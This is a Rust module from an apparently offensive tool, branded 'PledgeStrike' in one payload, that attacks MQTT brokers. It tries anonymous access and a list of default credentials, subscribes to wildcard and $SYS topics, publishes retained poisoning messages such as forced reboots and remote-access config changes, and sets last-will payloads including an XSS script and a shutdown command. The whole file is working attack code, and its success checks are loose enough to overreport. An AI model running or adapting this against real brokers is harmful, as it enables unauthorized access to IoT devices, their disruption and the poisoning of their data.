use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn connect(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} MQTT Broker Auth Bypass", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let body = serde_json::json!({
        "action": "mqtt_connect",
        "host": url,
        "port": 1883,
        "anonymous": true,
    });

    match client.post(url).json(&body).send().await {
        Ok(resp) => {
            let status = resp.status().as_u16();
            let text = resp.text().await.unwrap_or_default();
            let connected =
                text.contains("connected") || text.contains("accepted") || status == 200;
            let tag = if connected {
                "ANON ACCESS".red().bold().to_string()
            } else {
                "auth required".to_string()
            };
            println!("  {} Anonymous connect: {}", "*".cyan(), tag);
        }
        Err(_) => {
            println!("  {} Connection error", "*".red());
        }
    }

    let weak_creds = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", ""),
        ("guest", "guest"),
        ("user", "user"),
        ("root", "root"),
        ("mqtt", "mqtt"),
        ("test", "test"),
        ("", ""),
    ];

    println!("\n  {} Testing weak credentials:", "[*]".cyan().bold());
    for (user, pass) in &weak_creds {
        let body = serde_json::json!({"action": "mqtt_connect", "host": url, "port": 1883, "username": user, "password": pass});
        if let Ok(resp) = client.post(url).json(&body).send().await {
            let status = resp.status().as_u16();
            let text = resp.text().await.unwrap_or_default();
            let connected =
                text.contains("connected") || text.contains("accepted") || status == 200;
            if connected {
                println!(
                    "    {} {:15}:{:15} — {}",
                    "[+]".green().bold(),
                    user,
                    pass,
                    "CONNECTED".red().bold()
                );
            }
        }
    }

    let tls_body = serde_json::json!({"action": "mqtt_connect", "host": url, "port": 8883, "tls": true, "anonymous": true});
    if let Ok(resp) = client.post(url).json(&tls_body).send().await {
        let status = resp.status().as_u16();
        let text = resp.text().await.unwrap_or_default();
        if text.contains("connected") || status == 200 {
            println!(
                "\n  {} TLS port 8883 also accepts anonymous connections.",
                "[!]".red().bold()
            );
        }
    }
    Ok(())
}

pub async fn topic(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} MQTT Topic Wildcard Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let topics = [
        ("All messages", "#"),
        ("One level", "+"),
        ("Sensor data", "+/sensor/#"),
        ("Device commands", "+/cmd/#"),
        ("Status feeds", "+/status/#"),
        ("Admin topics", "admin/#"),
        ("Internal topics", "$SYS/#"),
        ("Health checks", "+/health/#"),
    ];

    for (name, topic) in &topics {
        let body = serde_json::json!({"action": "mqtt_subscribe", "host": url, "topic": topic});
        match client.post(url).json(&body).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();
                let subscribed =
                    text.contains("subscribed") || text.contains("success") || status == 200;
                let tag = if subscribed {
                    "SUBSCRIBED".red().bold().to_string()
                } else {
                    format!("status={}", status)
                };
                println!("  {} {:25} topic={:15} {}", "*".cyan(), name, topic, tag);
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), name);
            }
        }
    }

    println!(
        "\n{} Wildcard '#' subscribes to ALL topics — full data access.",
        "[*]".cyan().bold()
    );
    Ok(())
}

pub async fn retain(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} MQTT Retained Message Abuse", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let payloads = [
        (
            "Poison config",
            "cmd/config",
            "{\"debug\":true,\"remote_access\":true}",
        ),
        ("Fake sensor", "sensors/temp", "999.99"),
        (
            "Admin alert",
            "admin/alert",
            "{\"msg\":\"PledgeStrike was here\"}",
        ),
        ("Device reboot", "cmd/reboot", "NOW"),
        ("Data exfil", "exfil/data", "base64encoded_data_here"),
    ];

    for (name, topic, payload) in &payloads {
        let body = serde_json::json!({"action": "mqtt_publish", "host": url, "topic": topic, "payload": payload, "retain": true});
        match client.post(url).json(&body).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();
                let published =
                    text.contains("published") || text.contains("success") || status == 200;
                let tag = if published {
                    "PUBLISHED".red().bold().to_string()
                } else {
                    format!("status={}", status)
                };
                println!("  {} {:25} topic={:15} {}", "*".cyan(), name, topic, tag);
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), name);
            }
        }
    }

    println!(
        "\n{} Retained messages persist until overwritten — persistent poisoning.",
        "[*]".cyan().bold()
    );
    Ok(())
}

pub async fn will(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} MQTT Last Will Message Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let will_payloads = [
        (
            "XSS will",
            "notifications/alert",
            "<script>alert('ps')</script>",
        ),
        ("Reboot will", "cmd/reboot", "FORCE"),
        ("Config will", "cmd/config", "{\"attacker_control\":true}"),
        ("Exfil will", "exfil/last", "data_blob"),
        ("DOS will", "system/shutdown", "NOW"),
    ];

    for (name, topic, payload) in &will_payloads {
        let body = serde_json::json!({
            "action": "mqtt_will",
            "host": url,
            "will_topic": topic,
            "will_payload": payload,
            "will_qos": 2,
            "will_retain": true,
        });
        match client.post(url).json(&body).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();
                let set = text.contains("accepted") || text.contains("success") || status == 200;
                let tag = if set {
                    "WILL SET".red().bold().to_string()
                } else {
                    format!("status={}", status)
                };
                println!("  {} {:25} topic={:15} {}", "*".cyan(), name, topic, tag);
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), name);
            }
        }
    }

    println!(
        "\n{} LWT executes when client disconnects — post-disconnect exploitation.",
        "[*]".cyan().bold()
    );
    Ok(())
}
